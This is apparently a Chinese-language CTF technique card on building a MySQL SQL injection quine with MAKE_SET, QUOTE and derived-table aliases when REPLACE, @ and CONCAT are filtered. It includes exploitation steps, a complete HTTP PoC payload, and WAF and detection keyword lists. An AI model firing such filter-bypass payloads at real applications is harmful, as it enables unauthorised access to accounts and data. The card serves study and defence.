---
id: web-generic-sqli-make-set-quote-derived-table-quine
title: MySQL Quine 在 REPLACE/@/CONCAT 被过滤时的构造：MAKE_SET(bits,...) + QUOTE(s) + 派生表列别名让查询结果等于输入
type: scenario
domain: web
path: web/generic/sqli
technique: mysql-make-set-quote-derived-table-quine
aliases:
- MAKE_SET Quine
- ezqueen
- 无 REPLACE 无 @ 的 SQL Quine
- QUOTE 函数 Quine
- 派生表列别名替代变量
- make_set 自引用
tags:
- web
- sqli
- mysql
- quine
- make-set
- quote
- derived-table
- waf-bypass
- keyword-filter
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V162
  verified_at: '2026-11-06T14:05:56+08:00'
  notes: 已对照 91068 原文 ezqueen 与图 06 核对：checkSql 过滤、MAKE_SET(15,...)+QUOTE(s)+派生表 t(x,s,y) 及最终 payload 均一致；0ops{...} 为原图 flag，未写入卡片。ezupload 跳过理由成立（现有 splitpos 卡明确含 Ⱥ 2→3 字节变体，php_ini 卡覆盖 Caddy 绕过）。PoC 未在本机复跑。
---

## 一句话结论

当 MySQL 注入点要求“UNION 返回的 `pwd` 必须严格等于提交的 `$pwd`”（Quine），而 WAF 又封禁了 `REPLACE`、`@`、`CONCAT`、`SUBSTR` 等常规构造时，可以用 `MAKE_SET(15, A, B, C, D)` 按位选串并用逗号拼接、用 `QUOTE(s)` 给字符串补上单引号并转义、用派生表 `(SELECT 0, '<template>', 0) t(x,s,y)` 的列别名 `s` 代替用户变量，拼出一个“输出等于自身源码”的 payload，使 `row['pwd'] === $pwd` 成立并读出 flag。

## 原理

- **Quine 要求**：示例代码 `SELECT pwd FROM users WHERE username='admin' and pwd='$pwd'` 后执行 `if ($row['pwd'] === $pwd) die(getenv('FLAG'));`；UNION 注入返回的第二列必须与输入的 `$pwd` 逐字节相同。
- **常规 quine 被过滤**：`REPLACE(@a:=模板, 占位符, HEX(@a))` 依赖 `REPLACE` 与 `@a` 用户变量，而 checkSql 黑名单包含 `replace`、`@`、`concat`、`substr/mid/left/right`、`insert`、`file`、`schema`、`sys` 等。
- **MAKE_SET 代替拼接**：`MAKE_SET(bits, str1, str2, ...)` 按 `bits` 的二进制位选择后续字符串，选中项用逗号连接返回。`MAKE_SET(15, A, B, C, D)`（15=1111）返回 `A,B,C,D`——逗号天然成为 payload 的分隔符，无需 CONCAT。
- **QUOTE 代替引号包裹**：`QUOTE(s)` 返回被单引号包裹并转义特殊字符的字符串；把模板 `s` 作为参数，可让输出片段自动带上首尾引号，同时把模板末尾的 `'` 转义，避免破坏 SQL 结构。
- **派生表列别名代替变量**：`FROM (SELECT 0, '<模板>', 0) t(x,s,y)` 建立一行三列的临时表，列名 `x,s,y`；`s` 就是模板文本，可被 `MAKE_SET` 多次引用，替代 `@a`。MySQL 8.0 的 `(SELECT 0,'...',0) t(x,s,y)` 语法糖可用。
- **自引用成立**：模板 B 是 payload 中从 `*/` 到 `from(select 0` 的子串；`MAKE_SET` 用逗号把 A=`'/*`、B、C=`QUOTE(s)`、D=`0)t(x,s,y)#` 连接，结果恰好等于完整 payload（C 的引号包裹与 B 的尾部拼接后与提交字符串一致），从而满足严格相等校验。
- **闭合原始查询**：payload 以 `'/*,*/` 开头，先用 `'` 闭合 `pwd='...'`，`/*,*/` 注释掉原查询剩余部分，`union select make_set(...) from (...) t(x,s,y)#` 返回一行；`#` 注释尾部。

## 触发条件

- MySQL/MariaDB，注入点为单引号字符串且可 UNION。
- 应用要求查询返回值与输入严格相等（Quine 场景）。
- WAF 过滤了 REPLACE、@、CONCAT 等常规 quine 函数，但未过滤 `MAKE_SET`、`QUOTE`、派生表、`UNION`。
- 输入长度受限（示例 200 字节），payload 需精简。

## 利用步骤

1. 确认注入点与列数，测试 `UNION SELECT 1, 2` 回显；确认应用比较返回行与提交值。
2. 确认 `REPLACE`/`@` 被拦截，测试 `MAKE_SET`、`QUOTE`、派生表语法可用。
3. 按四段构造 payload：
   - A = `0x272f2a` → `'/*`（闭合与注释开头）；
   - B = 模板 `s`，即 `*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0`；
   - C = `quote(s)`（同一模板加引号并转义）；
   - D = `0x30297428782c732c792923` → `0)t(x,s,y)#`。
4. 通过 `pwd` 提交最终 payload；`MAKE_SET(15,...)` 的输出与提交串相同，`row['pwd'] === $pwd` 成立，返回 FLAG。
5. 若长度超限，缩短列别名/模板、改用更短的函数或十六进制表示。

## PoC

```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

pwd='/*,*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0,'*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0',0)t(x,s,y)#
```

```sql
-- 等价的查询结构
SELECT pwd FROM users WHERE username='admin' and pwd=''/*,*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0,'*/ union ... from(select 0',0)t(x,s,y)#';
```

四段含义：

| 段 | 值 | 解码 |
|---|---|---|
| A | `0x272f2a` | `'/*` |
| B | `s` | `*/ union select make_set(...)from(select 0` |
| C | `quote(s)` | `'*/ union ... from(select 0'` |
| D | `0x30297428782c732c792923` | `0)t(x,s,y)#` |

## 变体与关联

- **替代函数**：`MAKE_SET` 可换 `ELT`/`FIELD` 等未被过滤的选串函数；`QUOTE` 可换 `CHAR(39)` 拼接；派生表列别名可换 MySQL 8.0 的 CTE。
- **标准 quine**：未被过滤时用 `REPLACE(@a:=模板, 占位符, HEX(@a))` 更短，见 `web-generic-sqli-replace-hex-self-referential-quine`。
- **哈希校验**：若比较 sha256，可在 quine 外再包 `SHA2(...,256)`。
- **关联**：`web-generic-sqli-backslash-quote-blacklist-hex-union-session-ssti`（同为引号黑名单下的 UNION 注入）。

## 检测与防御

- **修复**：参数化查询/预编译，禁止拼接；密码校验用数据库中的哈希，不比较返回行与输入。
- **WAF**：除 `REPLACE/@/CONCAT` 外，还应覆盖 `MAKE_SET`、`QUOTE`、`ELT`、派生表列别名、`UNION SELECT` 组合；对长度 200 内的自引用型 hex/函数嵌套做语义检测。
- **检测**：SQL 日志中出现 `make_set(`、`quote(`、`from(select 0`、`t(x,s,y)` 等自引用结构；同一参数在登录请求中返回 200 且响应含 FLAG。
- **加固**：数据库账号最小权限；错误不对外泄露；限制 UNION 与注释符使用。
